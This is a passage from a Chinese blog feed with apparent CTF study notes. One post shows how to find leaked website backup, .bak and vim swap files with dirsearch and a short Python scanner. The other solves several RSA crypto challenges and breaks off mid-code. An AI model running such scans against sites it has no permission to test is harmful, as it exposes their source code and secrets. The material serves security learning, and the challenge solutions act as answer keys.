    <id>https://zhangkaibin0921.github.io/2022/02/08/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2022-02-08T14:28:38.000Z</published>
    <updated>2022-02-08T15:10:14.517Z</updated>
    
    <content type="html"><![CDATA[<h2 id="disearch目录扫描工具"><a href="#disearch目录扫描工具" class="headerlink" title="disearch目录扫描工具"></a>disearch目录扫描工具</h2><p><a href="https://github.com/maurosoria/dirsearch">下载地址</a><br>我是放在kali里面的</p><p>使用方法:就是用python运行disearch.py文件<br>./dirsearch.py -u 地址 -e php</p><p>-u 指定url<br>-e 指定网站语言<br>-w 可以加上自己的字典（带上路径）<br>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）<br>–random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）</p><p>根据状态码查看是否存在<br><img src="/picture/web17.png"></p><p>所以扫描出了有robots.txt</p><h2 id="常见网站备份文件后缀名和文件名"><a href="#常见网站备份文件后缀名和文件名" class="headerlink" title="常见网站备份文件后缀名和文件名"></a>常见网站备份文件后缀名和文件名</h2><p>文件名：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’<br>后缀名：’tar’, ‘tar.gz’, ‘zip’, ‘rar’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url1 = <span class="hljs-string">&#x27;http://xxx.com&#x27;</span><span class="hljs-comment"># url为被扫描地址，后不加‘/’</span><br><br><span class="hljs-comment"># 常见的网站源码备份文件名</span><br>list1 = [<span class="hljs-string">&#x27;web&#x27;</span>, <span class="hljs-string">&#x27;website&#x27;</span>, <span class="hljs-string">&#x27;backup&#x27;</span>, <span class="hljs-string">&#x27;back&#x27;</span>, <span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-string">&#x27;wwwroot&#x27;</span>, <span class="hljs-string">&#x27;temp&#x27;</span>]<br><span class="hljs-comment"># 常见的网站源码备份文件后缀</span><br>list2 = [<span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;tar.gz&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;rar&#x27;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> list2:<br>        back = <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(j)<br>        url = <span class="hljs-built_in">str</span>(url1) + <span class="hljs-string">&#x27;/&#x27;</span> + back<br>        <span class="hljs-built_in">print</span>(back + <span class="hljs-string">&#x27;    &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(requests.get(url).status_code)<br></code></pre></td></tr></table></figure><p>其实和disearch原理类似，都是通过状态码来查看文件是否存在。（disearch可以扫备份文件）</p><h2 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h2><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码</p><p>如果打开一个php文件发现什么都没有或报错，可以尝试看看.bak</p><h2 id="vim缓存泄露"><a href="#vim缓存泄露" class="headerlink" title="vim缓存泄露"></a>vim缓存泄露</h2><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p><p>以 index.php 为例：<br>第一次产生的交换文件名为 <code>.index.php.swp</code><br>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件<br>第三次产生的交换文件则为 <code>.index.php.swn</code></p><p>使用curl访问即可直接看到交换文件的内容<br>curl是个非常厉害的东西，很多源码直接访问看不了，但是用curl就可以，看看<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><blockquote><p>博客内容大多来自ctfhub，<a href="https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/ccnRSCCk2nuEt2UWLbn7dL.html">参考博客</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;disearch目录扫描工具&quot;&gt;&lt;a href=&quot;#disearch目录扫描工具&quot; class=&quot;headerlink&quot; title=&quot;disearch目录扫描工具&quot;&gt;&lt;/a&gt;disearch目录扫描工具&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>密码学刷题(杂)</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98-%E6%9D%82/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98-%E6%9D%82/</id>
    <published>2022-02-07T05:21:28.000Z</published>
    <updated>2022-02-15T08:13:27.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2020-BJDCTF-Crypto-rsa"><a href="#2020-BJDCTF-Crypto-rsa" class="headerlink" title="2020-BJDCTF-Crypto-rsa"></a>2020-BJDCTF-Crypto-rsa</h2><p>因为给了e，所以后面有些条件并不用到（如果没有给e，就会用到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><br>flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>e = <span class="hljs-number">52361</span><br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">assert</span>(e&lt;<span class="hljs-number">100000</span>)<br>n=p*q<br>m=bytes_to_long(flag)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span> c,n<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(<span class="hljs-number">294</span>,e,n)<br><br>p=getPrime(<span class="hljs-number">1024</span>)<br>n=p*q<br>m=bytes_to_long(<span class="hljs-string">&quot;BJD&quot;</span>*<span class="hljs-number">32</span>)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span> c,n<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output:</span><br><span class="hljs-string">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span><br><span class="hljs-string">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span><br><span class="hljs-string">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721  12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br>e = <span class="hljs-number">52361</span><br>c1=<span class="hljs-number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span><br>n1=<span class="hljs-number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span><br>n2=<span class="hljs-number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span><br><br>q=gmpy2.gcd(n1,n2)<br>p=n1//q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c1,d,n1)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br></code></pre></td></tr></table></figure><p>这一题我大意了，我以为是两个同余式，解出e的，没想到e是直接根据pow(294,e,n)爆破出来的。<br>（不知道那个同余式能不能解出来，但应该有点难解）</p><hr><h2 id="GWCTF-2019-BabyRSA"><a href="#GWCTF-2019-BabyRSA" class="headerlink" title="[GWCTF 2019]BabyRSA"></a>[GWCTF 2019]BabyRSA</h2><p>这一题和下一题同样是需要解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&#x27;GWHT&#123;******&#125;&#x27;</span><br>secret = <span class="hljs-string">&#x27;******&#x27;</span><br><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">38</span>)<br><br>half = <span class="hljs-built_in">len</span>(flag) / <span class="hljs-number">2</span><br><br>flag1 = flag[:half]<br>flag2 = flag[half:]<br><br>secret_num = getPrime(<span class="hljs-number">1024</span>) * bytes_to_long(secret)<br><br>p = sympy.nextprime(secret_num)<br>q = sympy.nextprime(p)<br><br>N = p * q<br><br>e = <span class="hljs-number">0x10001</span><br><br>F1 = bytes_to_long(flag1)<br>F2 = bytes_to_long(flag2)<br><br>c1 = F1 + F2<br>c2 = <span class="hljs-built_in">pow</span>(F1, <span class="hljs-number">3</span>) + <span class="hljs-built_in">pow</span>(F2, <span class="hljs-number">3</span>)<br><span class="hljs-keyword">assert</span>(c2 &lt; N)<br><br>m1 = <span class="hljs-built_in">pow</span>(c1, e, N)<br>m2 = <span class="hljs-built_in">pow</span>(c2, e, N)<br><br>N=<span class="hljs-number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span><br>m1=<span class="hljs-number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span><br>m2=<span class="hljs-number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sympy.abc <span class="hljs-keyword">import</span> x,y<br><span class="hljs-keyword">import</span> libnum<br><br>N=<span class="hljs-number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span><br>m1=<span class="hljs-number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span><br>m2=<span class="hljs-number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span><br><span class="hljs-comment">#N分解为p、q</span><br>p= <span class="hljs-number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span><br>q= <span class="hljs-number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span><br>e = <span class="hljs-number">65537</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>c1=<span class="hljs-built_in">pow</span>(m1,d,N)<br>c2=<span class="hljs-built_in">pow</span>(m2,d,N)<br><br><span class="hljs-comment">#解出F1、F2</span><br><span class="hljs-comment"># F=solve([pow(x,3)+pow(y,3)-c2,x+y-c1],[x,y])</span><br><span class="hljs-comment"># print(F)</span><br>F1=<span class="hljs-number">1141553212031156130619789508463772513350070909</span><br>F2=<span class="hljs-number">1590956290598033029862556611630426044507841845</span><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(F2))+libnum.n2s(<span class="hljs-built_in">int</span>(F1)))<br><br></code></pre></td></tr></table></figure><hr><h2 id="2020-BJDCTF-Crypto-EasyRSA"><a href="#2020-BJDCTF-Crypto-EasyRSA" class="headerlink" title="2020-BJDCTF-Crypto-EasyRSA"></a>2020-BJDCTF-Crypto-EasyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> Derivative<br><span class="hljs-keyword">from</span> fractions <span class="hljs-keyword">import</span> Fraction<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br>e=<span class="hljs-number">65537</span><br>n=p*q<br>z=Fraction(<span class="hljs-number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="hljs-number">1</span>,Derivative(arth(q),q))<br>m=bytes_to_long(flag)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c,z,n)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output:</span><br><span class="hljs-string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span><br><span class="hljs-string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span><br><span class="hljs-string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q))<br>是pow(p,2)+pow(q,2)的意思</p><p>Fraction(a,b) 相当于 a/b<br>Derivative(f(x),x) : 当x=’x’时,求f(x)的导数值<br><a href="https://baike.baidu.com/item/%E5%8F%8D%E5%8F%8C%E6%9B%B2%E5%87%BD%E6%95%B0/7924014?fr=aladdin">arth(q)反双曲线正切函数</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sympy.abc <span class="hljs-keyword">import</span> p,q<br><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span><br>z=<span class="hljs-number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span><br>n=<span class="hljs-number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span><br><br>PQ=solve([<span class="hljs-built_in">pow</span>(p,<span class="hljs-number">2</span>)+<span class="hljs-built_in">pow</span>(q,<span class="hljs-number">2</span>)-z,p*q-n],[p,q])<br><span class="hljs-built_in">print</span>(PQ)<br><span class="hljs-comment">#得到p，q</span><br>p=<span class="hljs-number">105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span><br>q=<span class="hljs-number">144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><p>调用库解方程方法的使用！！！<br>from sympy import*<br>from sympy.abc import p,q<br>PQ=solve([pow(p,2)+pow(q,2)-z,p*q-n],[p,q]) </p><p>两个参数均为列表，第一个参数为方程列表(将方程右端为0，只将左半部分写入列表)，第二个参数为未知数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#解方程的写法</span><br>c=mpz(<span class="hljs-number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>)<br>z=mpz(<span class="hljs-number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>)<br>n=mpz(<span class="hljs-number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>)<br>e=<span class="hljs-number">65537</span><br>pqplus=iroot(z+<span class="hljs-number">2</span>*n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>pqminus=iroot(z-<span class="hljs-number">2</span>*n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>p=(pqminus+pqplus)//<span class="hljs-number">2</span><br>q=(pqplus-pqminus)//<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><hr><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span 